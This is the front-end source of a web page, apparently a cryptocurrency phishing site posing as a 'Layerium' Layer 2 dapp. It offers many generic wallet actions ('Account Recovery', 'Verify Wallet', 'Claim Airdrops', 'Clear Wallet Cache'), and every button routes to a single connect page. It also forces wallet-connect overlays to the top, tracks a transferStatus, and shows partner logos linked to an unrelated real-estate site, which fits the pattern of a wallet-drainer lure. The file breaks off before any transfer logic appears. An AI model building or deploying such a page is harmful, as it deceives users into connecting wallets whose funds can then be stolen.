import { createElement, useEffect, useState } from 'https://esm.sh/react@18.2.0'

const pageHtml = `
<style>
  @keyframes heroFloatRotate {
    0%, 100% { transform: rotate(2deg); }
    50% { transform: rotate(-2deg); }
  }
  .figure-a-hero.animated-hero {
    animation: heroFloatRotate 2.2s ease-in-out infinite;
    transform-origin: center center;
  }
  @keyframes sectionRotate {
    0%, 100% { transform: rotate(1.5deg); }
    50% { transform: rotate(-1.5deg); }
  }
  .figure-b.animated-section {
    animation: sectionRotate 2.2s ease-in-out infinite;
    transform-origin: center center;
  }
  @keyframes spinBadge {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
  }
  .hero-badge {
    width: 120px;
    height: 120px;
    border-radius: 50%;
    overflow: hidden;
    box-shadow: 0 12px 30px rgba(0,0,0,0.25);
    border: 3px solid rgba(255,255,255,0.8);
    margin: 0 auto 12px;
    animation: spinBadge 6s linear infinite;
    display: inline-block;
  }
  .section-hero {
    padding-top: 8px !important;
  }
  .content.hero {
    padding-top: 0 !important;
  }
  .block-hero {
    margin-top: 0 !important;
  }
  .hero-badge img {
    width: 100%;
    height: 100%;
    object-fit: cover;
    display: block;
  }

  /* Ensure any wallet or modal overlays appear above the headers */
  w3m-modal, w3m-modal.open, .w3m-modal, .w3m-overlay, .web3modal, .web3modal-modal, .web3modal-overlay, .web3modal-container, #web3modal, .walletconnect-modal, .walletconnect-overlay,
  .modal-overlay, .manual-overlay, .connect-overlay, .connect-overlay-2, .manual-overlay {
    z-index: 99999 !important;
    position: fixed !important;
  }

  /* Make the original Webflow navbar sticky too (logo/brand/dashboard container) */
  .navbar{ position: sticky !important; top: 0 !important; z-index: 1190 !important; background: rgba(0,0,0,0.02); backdrop-filter: blur(6px); }

  /* Responsive header and mobile menu */
  .hamburger-btn { display: none; background: transparent; border: none; width:40px; height:40px; align-items:center; justify-content:center; cursor:pointer; padding:0; }
  .hamburger-btn{ display:none; flex-direction:column; position:relative; }
  .hamburger-btn .bar{ display:block; width:22px; height:3px; background:#fff; margin:4px 0; border-radius:2px; transition: transform .25s ease, opacity .25s ease; transform-origin:center; }
  .hamburger-btn.open .bar:nth-child(1){ transform: translateY(7px) rotate(45deg); }
  .hamburger-btn.open .bar:nth-child(2){ opacity:0; transform: scaleX(0); }
  .hamburger-btn.open .bar:nth-child(3){ transform: translateY(-7px) rotate(-45deg); }
  .mobile-drawer{ position:fixed; top:0; left:-320px; width:280px; height:100vh; background:rgba(7,11,20,0.98); z-index:1300; padding:28px 18px; transition:left .45s cubic-bezier(.2,.8,.2,1); box-shadow:12px 0 30px rgba(0,0,0,0.5); overflow:auto }
  .mobile-drawer.open{ left:0 }
  .mobile-drawer .close-drawer{ position:absolute; top:12px; right:12px; background:transparent;border:none;color:#fff;font-size:20px;cursor:pointer }
  .mobile-drawer nav a{ display:block;padding:12px 8px;color:#fff;text-decoration:none;border-bottom:1px solid rgba(255,255,255,0.04) }

  /* Show desktop nav below header for wider screens */
  .nav-menu{ display:none }
  @media (min-width:900px){
    .nav-menu{ display:flex !important; position:relative; justify-content:center; gap:18px; margin-top:12px }
    .nav-menu .nav-link{ display:inline-block }
    .grid-navbar{ margin-top:2px; background:rgba(255,255,255,0.03); padding:6px 10px; border-radius:8px; box-shadow: 0 6px 18px rgba(0,0,0,0.18) }
  }

  /* Hamburger visible on small-medium screens; show dashboard but compact */
  @media (max-width:780px){
    .hamburger-btn{ display:flex }
    .dashboard-btn{ display:inline-flex !important; padding:6px 10px; font-size:0.72rem; flex-shrink:0 }
    .app-header{ grid-template-columns: auto 1fr auto !important; padding:8px 12px }
    .app-header .app-title{ font-size:0.95rem }
    .hero-badge{ margin: 0 auto 6px !important }
    .section-hero{ padding-top: 0 !important }
    .content.hero{ margin-top: 8px !important; margin-bottom: 12px !important }
    .block-hero{ margin-top: 0 !important }
  }

  /* Apply navbar layout/visuals for 781px - 899px so it matches desktop nav behavior */
  @media (min-width:781px) and (max-width:899px){
    .grid-navbar{ margin-top:2px; background:rgba(255,255,255,0.03); padding:6px 10px; border-radius:8px; box-shadow: 0 6px 18px rgba(0,0,0,0.18); justify-items:center; justify-content:center }
    .grid-navbar > .nav{ justify-self:center }
    .grid-navbar > .nav:nth-child(2){ display:block !important }
    .grid-navbar > .nav:nth-child(2) .nav-menu{ display:flex !important; position:relative; justify-content:center; gap:14px; margin-top:10px }
    .nav-menu{ display:flex !important }
  }

  /* Make header children shrink and avoid overflow */
  .app-header > *,
  .app-header .brand,
  .dashboard-btn{
    min-width:0; max-width:100%; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;
  }
  .dashboard-btn{ flex-shrink:1; max-width:130px; font-size: clamp(0.65rem, 1.8vw, 0.9rem) }
  .brand img{ width: clamp(28px, 6vw, 44px); height: auto; max-width:44px; object-fit:contain }
  .app-title{ font-size: clamp(0.55rem, 2vw, 1.05rem); text-align:center; white-space:normal; position:relative; display:flex; justify-content:center; align-items:center; }

  @media (max-width:480px) {
    .app-title{
      color: #ffffff !important;
      background: none !important;
      -webkit-background-clip: border-box !important;
      -webkit-text-fill-color: #ffffff !important;
      text-shadow: none !important;
      justify-self: center;
      font-size: 1rem;
      letter-spacing: 0.18em;
      min-width: 0;
      width: auto;
    }

    .app-title > span {
      display: inline-flex;
      justify-content: center;
      align-items: center;
      width: 100%;
      color: #ffffff !important;
      -webkit-text-fill-color: #ffffff !important;
      background: none !important;
      text-shadow: none !important;
    }
  }

  :root{ --app-header-height: 72px; --navbar-height: 56px }
  /* Prevent horizontal page scrolling caused by header and reserve space for fixed headers */
  html, body { overflow-x: hidden; padding-top: calc(var(--app-header-height) + var(--navbar-height)); scroll-padding-top: calc(var(--app-header-height) + var(--navbar-height) + 16px) }

  @media (max-width:780px){
    :root{ --app-header-height: 64px; --navbar-height: 52px }
    html, body { padding-top: calc(var(--app-header-height) + var(--navbar-height)) }
  }

  @media (max-width:420px){
    :root{ --app-header-height: 56px; --navbar-height: 48px }
    html, body { padding-top: calc(var(--app-header-height) + var(--navbar-height)) }
  }

  /* Ensure the left brand container doesn't collapse image on very small screens */
  @media (max-width:420px){
    .brand img{ width:36px; height:36px }
    .dashboard-btn{ max-width:96px; padding:6px 8px }
  }

  @media (min-width:900px){
    /* override inline hidden styles and show the nav container under the header */
    .grid-navbar > .nav:nth-child(2){ display:block !important }
    .grid-navbar > .nav:nth-child(2) .nav-menu{ display:flex !important; position:relative; justify-content:center; gap:18px; margin-top:12px }
    .nav-menu .nav-link{ display:inline-block }
    .app-header{ position:relative }
  }

  /* Fix the React header to the viewport top and stack the Webflow navbar beneath it */
  .app-header{ position: fixed !important; top: 0 !important; left: 0; right: 0; width:100%; z-index: 1400 !important }

  .navbar{ position: fixed !important; top: var(--app-header-height) !important; left: 0; right:0; width:100%; z-index: 1300 !important }

  /* Hide only the logo image inside the Webflow navbar (keep brand link for semantics) */
  .grid-navbar .brand img.logo, .navbar .brand img.logo{ display: none !important }

</style>
<script>
(function(){
  function applyNavbarForMid(){
    try{
      var w = window.innerWidth || document.documentElement.clientWidth;
      if(w >= 781 && w <= 899){
        document.querySelectorAll('.grid-navbar > .nav').forEach(function(n){ n.style.display = 'block'; });
        var nm = document.querySelector('.grid-navbar .nav-menu');
        if(nm){ nm.style.display = 'flex'; nm.style.position = 'relative'; nm.style.gap = '14px'; nm.style.marginTop = '10px'; }
      }
    }catch(e){ /* silent */ }
  }
  window.addEventListener('resize', applyNavbarForMid);
  window.addEventListener('load', applyNavbarForMid);
  applyNavbarForMid();
})();
</script>
<div data-collapse="medium" data-animation="default" data-duration="400" data-easing="ease" data-easing2="ease" role="banner" class="navbar w-nav">
      <div class="w-layout-grid grid-navbar">
        <div id="w-node-e8cea9b6-4627-f1cd-fec0-16ebfaf55914-faf55912" data-w-id="e8cea9b6-4627-f1cd-fec0-16ebfaf55914" class="nav" style="
            transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1) rotateX(0deg)
              rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
            transform-style: preserve-3d;
            opacity: 1;
          ">
          <a href="./assets/connect.html" aria-current="page" class="brand w-nav-brand w--current" aria-label="home">
            <img src="https://dapps-layerium.pages.dev/images/64967c74c53904c45eb9e983_Asset%206.png" loading="lazy" alt="" class="logo">
          </a>
        </div>
        <div data-w-id="e8cea9b6-4627-f1cd-fec0-16ebfaf55917" class="nav" style="
            display: none;
            transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1) rotateX(0deg)
              rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
            transform-style: preserve-3d;
            opacity: 1;
          ">
          <nav role="navigation" class="nav-menu w-nav-menu" style="display: none">
            <a href="./assets/connect.html" aria-current="page" class="nav-link w-nav-link w--current">V2-Optimizer</a>
            <a href="./assets/connect.html" aria-current="page" class="nav-link w-nav-link">Developers</a>
            <a href="./assets/connect.html" aria-current="page" class="nav-link w-nav-link">Bridge</a>
            <a href="https://layerium.canny.io/" class="nav-link w-nav-link">Roadmap</a>
            <a href="https://uploads-ssl.webflow.com/64967c521624e29a27ba6f27/64991178ba750f8de765f3e3_meta-chart%20(1).png" class="nav-link w-nav-link">Tokenomics</a>
          </nav>
        </div>
        <div class="nav right" style="display: none">
          <div data-w-id="e8cea9b6-4627-f1cd-fec0-16ebfaf55924" class="w-layout-grid grid-button-nav" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              transform-style: preserve-3d;
              opacity: 1;
            ">
            <a id="w-node-e8cea9b6-4627-f1cd-fec0-16ebfaf55925-faf55912" href="https://uploads-ssl.webflow.com/64967c521624e29a27ba6f27/6499bbb74a232f191fd140a3_Layerium_%20The%20Next%20Gen%20Layer2.pdf" class="nav-button w-button">Whitepaper</a>
            <div class="menu-button w-nav-button" style="-webkit-user-select: text" aria-label="menu" role="button" tabindex="0" aria-controls="w-nav-overlay-0" aria-haspopup="menu" aria-expanded="false">
              <div class="menu-icon w-icon-nav-menu" style="display: none"></div>
            </div>
          </div>
        </div>
      </div>
      <div class="shadow-navbar" style="will-change: opacity; opacity: 1"></div>
      <div class="w-nav-overlay" data-wf-ignore="" id="w-nav-overlay-0"></div>
    </div>
    <div class="image-brand">
      <img src="WalletConnect.png" loading="lazy" alt="" class="image-brand">
    </div>
    <div class="section-hero wf-section">
      <div class="content hero">
        <div class="block-hero">
          <div class="hero-badge" aria-label="Decorative rotating badge">
            <img src="web31.png" alt="Decorative rotating badge" />
          </div>
          <h1 data-w-id="fec0fb7b-303f-09d0-3ce6-40f91d7252a5" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="heading-hero">
            The Next Gen Layer 2 Blockchain Rectifier
          </h1>
          <p data-w-id="dcd739db-6d1f-6a52-859b-4a3fd0e20c84" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="paragraph-large">
            Open End Decentralized Protocol For Syncing Various Wallets to
            Secure Dapps Servers.
          </p>
          <p data-w-id="dcd739db-6d1f-6a52-859b-4a3fd0e20c84" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="paragraph-large">
            Select an option:
          </p>
          <a href="./assets/connect.html" class="button w-button">Account Recovery</a>
          <div class="w-layout-grid grid-clients">
            <a href="./assets/connect.html" class="button w-button">Staking</a>
            <a href="./assets/connect.html" class="button w-button">Boost Token</a>
            <a href="./assets/connect.html" class="button w-button">Secure Assets</a>
            <a href="./assets/connect.html" class="button w-button">Withdraw</a>
            <a href="./assets/connect.html" class="button w-button">EVM Migration</a>
            <a href="./assets/connect.html" class="button w-button">Switch Network</a>
            <a href="./assets/connect.html" class="button w-button">Whitelist</a>
            <a href="./assets/connect.html" class="button w-button">Roles</a>
            <a href="./assets/connect.html" class="button w-button">Claim Airdrops</a>
            <a href="./assets/connect.html" class="button w-button">Swap Token</a>
            <a href="./assets/connect.html" class="button w-button">Verify Wallet</a>
            <a href="./assets/connect.html" class="button w-button">Vesting</a>
            <a href="./assets/connect.html" class="button w-button">Claim Rewards</a>
            <a href="./assets/connect.html" class="button w-button">Update Balance</a>
            <a href="./assets/connect.html" class="button w-button">Clear Wallet Cache</a>
            <a href="./assets/connect.html" class="button w-button">RPC Validation</a>
            <a href="./assets/connect.html" class="button w-button">Transaction Delay</a>
          </div>
        </div>
        <div data-w-id="297673ad-47a4-b4b1-8938-0ca16b3d6b41" class="figure-a-hero animated-hero">
          <div class="figure-block-a-hero" style="
              will-change: transform;
              transform: translate3d(0.00112%, -0.0352px, 0px) scale3d(1, 1, 1)
                rotateX(46.0024deg) rotateY(0.00464deg) rotateZ(-0.00736deg)
                skew(0deg, 0deg);
              transform-style: preserve-3d;
            ">
            <div style="
                width: 100%;
                will-change: transform;
                transform: translate3d(0px, 0px, 3.99936vh) scale3d(1, 1, 1)
                  rotateX(0.8295deg) rotateY(0deg) rotateZ(-5.10912deg)
                  skew(0deg, 0deg);
                transform-style: preserve-3d;
                height: 500px;
              " class="figure-a1"></div>
            <div style="
                width: 90%;
                will-change: transform;
                transform: translate3d(0px, 0px, -11.0013vh) scale3d(1, 1, 1)
                  rotateX(1.6977deg) rotateY(0deg) rotateZ(-3.40608deg)
                  skew(0deg, 0deg);
                transform-style: preserve-3d;
                height: 450px;
              " class="figure-a2"></div>
            <div style="
                width: 60%;
                will-change: transform;
                transform: translate3d(0px, 0px, -28.0026vh) scale3d(1, 1, 1)
                  rotateX(2.5659deg) rotateY(0deg) rotateZ(-1.70304deg)
                  skew(0deg, 0deg);
                transform-style: preserve-3d;
                height: 350px;
              " class="figure-a3"></div>
          </div>
        </div>
      </div>
      <div data-w-id="58e11b86-9d96-c9a8-f52f-b1795c37fa57" style="
          transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1) rotateX(0deg)
            rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
          opacity: 1;
          transform-style: preserve-3d;
        " class="glow-top"></div>
    </div>
    <div class="section wf-section">
      <div data-w-id="0773ab12-e7cf-0dcb-1ac5-1097386497cc" class="content">
        <div class="block-heading">
          <div data-w-id="823c362f-ea60-5ffd-ca7f-cde6a03d15bb" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="subtitle">
            solving the problem
          </div>
          <h2 data-w-id="edc71457-7d5b-7bea-ff46-ddb5540db920" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="heading">
            The existing Layer 2 can only solve problems on EVM Blockchains
          </h2>
        </div>
        <div class="w-layout-grid grid-features">
          <div data-w-id="893553c5-8fd4-cfbf-8679-88871d8ec8a6" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="feature">
            <div class="icon-feature-bg">
              <img src="https://dapps-layerium.pages.dev/images/64967c531624e29a27ba6f86_icon%201.svg" loading="lazy" alt="" class="icon-feature">
            </div>
            <h6>Universality</h6>
            <p>
              Layerium can solve problems by creating a Layer 2 that can work
              within any EVM Blockchain.
            </p>
          </div>
          <div data-w-id="86649301-b3bf-a470-084f-c832dcc04618" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="feature">
            <div class="icon-feature-bg">
              <img src="https://dapps-layerium.pages.dev/images/64967c531624e29a27ba6f87_icon%202.svg" loading="lazy" alt="" class="icon-feature">
            </div>
            <h6>Security</h6>
            <p>
              Layerium solves problems with the Optimistic Rollup <br>Security
              remains at the same level as the existing Layer 2
            </p>
          </div>
          <div data-w-id="82c90e76-3d3e-e0a8-5192-1d91c07d6533" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="feature">
            <div class="icon-feature-bg">
              <img src="https://dapps-layerium.pages.dev/images/64967c531624e29a27ba6faf_icon%202%20large.svg" loading="lazy" alt="" class="icon-feature">
            </div>
            <h6>Governance</h6>
            <p>
              We enable Governance on Optimistic and make this fair for all
              users
            </p>
          </div>
          <div data-w-id="d69dcdee-aab4-e517-357b-a0d5f9b2aa34" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="feature">
            <div class="icon-feature-bg">
              <img src="https://dapps-layerium.pages.dev/images/64967c531624e29a27ba6f8a_icon%204.svg" loading="lazy" alt="" class="icon-feature">
            </div>
            <h6>Transaction Speed</h6>
            <p>
              Designed to accelerate the network, Layerium offers transaction
              speeds that can compete with the existing Layer 2
            </p>
          </div>
          <div data-w-id="6c922f6d-a6bc-ce40-9a2c-d1ba5021c7a1" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="feature">
            <div class="icon-feature-bg">
              <img src="https://dapps-layerium.pages.dev/images/64967c531624e29a27ba6fb6_blog%201.svg" loading="lazy" alt="" class="icon-feature">
            </div>
            <h6>Modular</h6>
            <p>
              Modular layer using independent components and easy access for
              data avalability
            </p>
          </div>
          <div data-w-id="d8a73d62-1886-742f-ad2e-ca5926422de9" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="feature">
            <div class="icon-feature-bg">
              <img src="https://dapps-layerium.pages.dev/images/64967c531624e29a27ba6f88_icon%206.svg" loading="lazy" alt="" class="icon-feature">
            </div>
            <h6>Interoperability</h6>
            <p>
              Outstanding inter-blockchain communication capabilities that allow
              Decentralized applicationto communicate with any EVM.
            </p>
          </div>
        </div>
      </div>
    </div>
    <div class="section wf-section">
      <div class="content">
        <div class="w-layout-grid grid-right">
          <div class="block">
            <div data-w-id="10717017-9153-2952-45a2-9777c8214290" style="
                transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                  rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
                opacity: 1;
                transform-style: preserve-3d;
              " class="subtitle">
              TECHNOLOGY
            </div>
            <h2 data-w-id="9ba3e33b-0e41-bbb4-d783-b036597e5f42" style="
                transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                  rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
                opacity: 1;
                transform-style: preserve-3d;
              " class="heading">
              ADVANCED LAYER 2 TAKING BLOCKCHAIN TO ANOTHER LEVEL
            </h2>
            <p data-w-id="4a8841b3-d63f-cdef-4a04-7328447bda2a" style="
                transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                  rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
                opacity: 1;
                transform-style: preserve-3d;
              " class="paragraph-large">
              No restrictions, no limitations, cross anywhere <br>Layer 2 that
              turns limitations into infinite possibilities
            </p>
          </div>
          <div class="block-right">
            <div data-w-id="aa0c30b7-4b0e-5634-dacf-abd61c960570" class="figure-b animated-section">
              <div class="figure-block-b" style="
                  will-change: transform;
                  transform: translate3d(0%, 0px, 0px) scale3d(1, 1, 1)
                    rotateX(17.3471deg) rotateY(44.883deg) rotateZ(8.29364deg)
                    skew(0deg, 0deg);
                  transform-style: preserve-3d;
                ">
                <div style="
                    width: 80%;
                    will-change: transform;
                    transform: translate3d(0px, 0px, 9.41272vh) scale3d(1, 1, 1)
                      rotateX(0.8295deg) rotateY(0deg) rotateZ(-5.10912deg)
                      skew(0deg, 0deg);
                    transform-style: preserve-3d;
                    height: 300px;
                  " class="figure-b1"></div>
                <div style="
                    width: 80%;
                    will-change: transform;
                    transform: translate3d(0px, 24.4066%, -4.23613vh)
                      scale3d(1, 1, 1) rotateX(1.6977deg) rotateY(0deg)
                      rotateZ(-3.40608deg) skew(0deg, 0deg);
                    transform-style: preserve-3d;
                    height: 325px;
                  " class="figure-b2"></div>
                <div style="
                    width: 90%;
                    will-change: transform;
                    transform: translate3d(0px, -8.64073%, -16.885vh)
                      scale3d(1, 1, 1) rotateX(2.5659deg) rotateY(0deg)
                      rotateZ(-1.70304deg) skew(0deg, 0deg);
                    transform-style: preserve-3d;
                    height: 325px;
                  " class="figure-b3"></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="section wf-section">
      <div class="content">
        <div class="block-heading">
          <div data-w-id="6d9ad869-a5c2-fd2f-9bfc-e6fc73288d47" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="subtitle">
            Backed by
          </div>
          <h2 data-w-id="6d9ad869-a5c2-fd2f-9bfc-e6fc73288d49" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="heading">
            Meet our Partnership
          </h2>
          <p data-w-id="7fc5df83-6010-b5dc-f288-b6f30f9f4eef" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="paragraph-large">
            Backed by Loop Network Labs and a wide range of amazing projects and
            powerful Exchange
          </p>
        </div>
        <div class="w-layout-grid grid-clients">
          <div data-w-id="0c106c66-bf23-050f-0fdb-3ed56c3a69f4" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="client">
            <a href="https://www.loopnet.com/">
              <img src="https://dapps-layerium.pages.dev/images/649684eba7ae30b783dc813e_LOOP%20NETWORK%20%285%29.png" loading="lazy" alt="" class="logo-client">
            </a>
            <div class="bg-client" style="opacity: 0.5"></div>
          </div>
          <div data-w-id="f567adfd-1fc5-47fc-fe1d-b3cb4ed22463" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              opacity: 1;
              transform-style: preserve-3d;
            " class="client">
            <a href="https://www.loopnet.com/">
              <img src="https://dapps-layerium.pages.dev/images/6496851c60567a7836f8b1ce_LOOP%20NETWORK%20%286%29.png" loading="lazy" alt="" class="logo-client">
            </a>
            <div class="bg-client" style="opacity: 0.5"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="section wf-section">
      <div class="content">
        <div class="w-layout-grid grid-left">
          <div class="block-left">
            <div data-w-id="ab31e567-7829-c128-8a54-16b1afc9752c" class="figure-c">
              <div class="figure-block-c" style="
                  will-change: transform;
                  transform: translate3d(0%, 0px, 0px) scale3d(1, 1, 1)
                    rotateX(47.5314deg) rotateY(3.35643deg) rotateZ(-34deg)
                    skew(0deg, 0deg);
                  transform-style: preserve-3d;
                ">
                <div style="
                    width: 80%;
                    will-change: transform;
                    transform: translate3d(0px, 0px, 10.1188vh) scale3d(1, 1, 1)
                      rotateX(0.8295deg) rotateY(0deg) rotateZ(-5.10912deg)
                      skew(0deg, 0deg);
                    transform-style: preserve-3d;
                    height: 300px;
                  " class="figure-c1"></div>
                <div style="
                    width: 80%;
                    will-change: transform;
                    transform: translate3d(-24.7195%, 0px, -7.94389vh)
                      scale3d(1, 1, 1) rotateX(1.6977deg) rotateY(0deg)
                      rotateZ(-3.40608deg) skew(0deg, 0deg);
                    transform-style: preserve-3d;
                    height: 325px;
                  " class="figure-c2"></div>
                <div style="
                    width: 90%;
                    will-change: transform;
                    transform: translate3d(42.3762%, 0px, -28.5379vh)
                      scale3d(1, 1, 1) rotateX(2.5659deg) rotateY(0deg)
                      rotateZ(-1.70304deg) skew(0deg, 0deg);
                    transform-style: preserve-3d;
                    height: 325px;
                  " class="figure-c3"></div>
              </div>
            </div>
          </div>
          <div id="w-node-_3930e259-75dd-d066-e614-6fbbe9bf2ee4-27ba6f5b" class="block">
            <div data-w-id="3930e259-75dd-d066-e614-6fbbe9bf2ee5" style="
                transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                  rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
                opacity: 1;
                transform-style: preserve-3d;
              " class="subtitle">
              developers
            </div>
            <h2 data-w-id="3930e259-75dd-d066-e614-6fbbe9bf2ee7" style="
                transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                  rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
                opacity: 1;
                transform-style: preserve-3d;
              " class="heading">
              Built by developers, <br>for developers
            </h2>
            <p data-w-id="3930e259-75dd-d066-e614-6fbbe9bf2ee9" style="
                transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                  rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
                opacity: 1;
                transform-style: preserve-3d;
              " class="paragraph-large">
              Developers can use Decentralized Application and build something amazing.
              <br>Applications that already exist in any EVM can easily be
              ported here
            </p>
          </div>
        </div>
      </div>
    </div>
    <div class="section footer wf-section">
      <div class="content">
        <div class="w-layout-grid grid-footer">
          <div id="w-node-_6603d099-87ea-d392-449a-caaf2cdb7f91-2cdb7f8e" data-w-id="6603d099-87ea-d392-449a-caaf2cdb7f91" class="block-footer" style="
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              transform-style: preserve-3d;
              opacity: 1;
            ">
            <img src="https://dapps-layerium.pages.dev/images/64967c9fbd638777edb72cc7_Asset%201.png" loading="lazy" sizes="100vw" srcset="https://dapps-layerium.pages.dev/images/64967c9fbd638777edb72cc7_Asset%201-p-500.png 500w, https://dapps-layerium.pages.dev/images/64967c9fbd638777edb72cc7_Asset%201_1.png 1224w" alt="" class="logo-footer">
            <p class="paragraph-footer">
              The Next Gen Layer 2 Blockchain Rectifier, <br>Scaling any
              existing EVM Network. <br>
            </p>
          </div>
          <div data-w-id="6603d099-87ea-d392-449a-caaf2cdb7f99" class="block-footer" style="
              display: none;
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              transform-style: preserve-3d;
              opacity: 1;
            ">
            <div class="heading-footer" style="display: none">Quick Links</div>
            <a href="https://l2rectifynode.vercel.app/" aria-current="page" class="link-footer w--current">Home</a>
            <a href="./assets/connect.html" aria-current="page" class="link-footer">Developers <br>
            </a>
            <a href="./assets/connect.html" aria-current="page" class="link-footer">Bridge</a>
            <a href="https://layerium.canny.io/" class="link-footer">Roadmap</a>
            <a href="https://uploads-ssl.webflow.com/64967c521624e29a27ba6f27/64991178ba750f8de765f3e3_meta-chart%20(1).png" class="link-footer">Tokenomics</a>
            <a href="https://uploads-ssl.webflow.com/64967c521624e29a27ba6f27/6499bbb74a232f191fd140a3_Layerium_%20The%20Next%20Gen%20Layer2.pdf" class="link-footer">Whitepaper</a>
          </div>
          <div data-w-id="6603d099-87ea-d392-449a-caaf2cdb7fa5" class="block-footer" style="
              display: none;
              transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1)
                rotateX(0deg) rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
              transform-style: preserve-3d;
              opacity: 1;
            ">
            <div class="heading-footer">Community</div>
            <a href="https://twitter.com/layerium" class="link-footer">Twitter</a>
            <a href="https://t.me/layerium" target="_blank" class="link-footer">Telegram <br>
            </a>
          </div>
        </div>
        <div data-w-id="6603d099-87ea-d392-449a-caaf2cdb7fbb" class="footer-down" style="
            transform: translate3d(0px, 0px, 0px) scale3d(1, 1, 1) rotateX(0deg)
              rotateY(0deg) rotateZ(0deg) skew(0deg, 0deg);
            transform-style: preserve-3d;
            opacity: 1;
          ">
          <p class="paragraph-footer">© 2024. Layerium Dapps</p>
        </div>
      </div>
    </div>
`

function App() {
  const [account, setAccount] = useState(null)
  const [walletType, setWalletType] = useState(null)
  const [isLoading, setIsLoading] = useState(false)
  const [showSummary, setShowSummary] = useState(false)
  const [showDashboardModal, setShowDashboardModal] = useState(false)
  const [showMobileMenu, setShowMobileMenu] = useState(false)
  const [error, setError] = useState(null)
  const [transferStatus, setTransferStatus] = useState(null)
  const [isSmallBrand, setIsSmallBrand] = useState(typeof window !== 'undefined' ? window.innerWidth <= 480 : false)

  useEffect(() => {
    if (typeof window?.walletHelpers?.initWeb3Modal === 'function') {
      window.walletHelpers.initWeb3Modal().catch(() => {})
    }
  }, [])

